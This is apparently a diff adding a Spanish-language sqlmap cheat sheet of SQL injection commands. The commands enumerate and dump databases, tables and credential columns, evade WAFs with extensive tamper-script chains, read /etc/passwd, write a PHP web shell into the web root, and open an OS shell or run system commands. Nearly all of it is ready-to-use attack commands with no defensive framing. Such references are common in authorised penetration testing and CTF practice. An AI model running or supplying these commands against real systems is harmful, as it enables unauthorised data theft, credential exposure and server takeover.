@@ -1,0 +1,80 @@
+▶ Escaneo Global (Analizar solicitud guardada):
+  sqlmap -r pwned.txt --dump --batch
+
+▶ Descubrir DBs (Listar bases de datos):
+  sqlmap -u "$URL/pagina.php" --dbs
+
+▶ Descubrir DBs con Parámetros (Listar bases de datos con parámetros específicos):
+  sqlmap -u $URL -p <arguments> --dbs
+
+▶ Especificar Tipo de Base de Datos (Definir DBMS para escaneo):
+  sqlmap -u $URL -p <arguments> --dbms=<database_type>
+
+▶ Descubrir Tablas (Listar tablas de una DB):
+  sqlmap -u "$URL/pagina.php" -D nombre_db --tables
+
+▶ Descubrir Tablas con DBMS (Listar tablas con tipo de base de datos):
+  sqlmap -u $URL -p <arguments> --dbms=<database_type> -D <database_name> --tables
+
+▶ Listar Columnas de una Tabla (Descubrir columnas de una tabla):
+  sqlmap -u $URL -D nombre_db -T <table> --columns
+
+▶ Listar Columnas con DBMS (Listar columnas especificando tipo de base de datos):
+  sqlmap -u $URL -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> --columns
+
+▶ Volcar Tabla (Extraer datos de una tabla):
+  sqlmap -u "$URL/pagina.php" -D nombre_db -T nombre_tabla --dump
+
+▶ Volcar Columnas Específicas (Extraer campos específicos):
+  sqlmap -u "$URL/pagina.php" -D nombre_db -T nombre_tabla -C usuario,contraseña --dump
+
+▶ Volcar Columnas con DBMS (Volcar columnas específicas con tipo de base de datos):
+  sqlmap -u $URL -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> -C <columns> --dump
+
+▶ Con Cookies (Usar cookies para autenticación):
+  sqlmap -u "$URL/pagina.php" --cookie "PHPSESSID=1234567890abcdef" --dbs
+
+▶ Shell Inversa (Obtener shell remota):
+  sqlmap -u "$URL/dashboard.php?search=any" --cookie="PHPSESSID=1234567890abcdef" --os-shell
+
+▶ Inyección Clásica GET (Probar inyección en URL GET):
+  sqlmap -u $URL
+
+▶ Inyección Clásica POST (Probar inyección en datos POST):
+  sqlmap -u $URL --data "username=admin&password=test" --dbs
+
+▶ Inyección Ciega (Explotación sin respuesta visible):
+  sqlmap -u "$URL/pagina.php" --data="id=1" --technique=B
+
+▶ Inyección en Cabeceras (Atacar vía headers):
+  sqlmap -u "$URL/pagina.php" --headers="X-Forwarded-For: *"
+
+▶ Evasión de WAF (Evadir filtros de seguridad):
+  sqlmap -u "$URL/pagina.php" --tamper=space2comment --level 3
+
+▶ Inyección con Tamper Clásico (Usar scripts tamper para evasión):
+  sqlmap -u "$URL" --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+
+▶ Inyección Avanzada Hardcore (Máximo nivel y riesgo con tamper):
+  sqlmap -u "$URL" --level=5 --risk=3 -p "<parameter>" --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+
+▶ Inyección con Tamper para MySQL (Usar tamper específicos para MySQL):
+  sqlmap -u $URL --dbms=MYSQL --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+
+▶ Inyección con Tamper para MSSQL (Usar tamper específicos para MSSQL):
+  sqlmap -u $URL --dbms=MSSQL --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+
+▶ Explotación de Tiempo (Ataque basado en retrasos):
+  sqlmap -u "$URL/pagina.php" --technique=T
+
+▶ Lectura de Archivos (Acceder a archivos locales):
+  sqlmap -u "$URL/pagina.php" --file-read="/etc/passwd"
+
+▶ Escritura de Archivos (Subir archivo al servidor):
+  sqlmap -u "$URL/pagina.php" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+▶ Ejecución de Comandos (Ejecutar comandos del sistema):
+  sqlmap -u "$URL/pagina.php" --os-cmd="whoami"
+
+▶ Escaneo Masivo (Analizar múltiples URLs):
+  sqlmap -m urls.txt --batch --random-agent
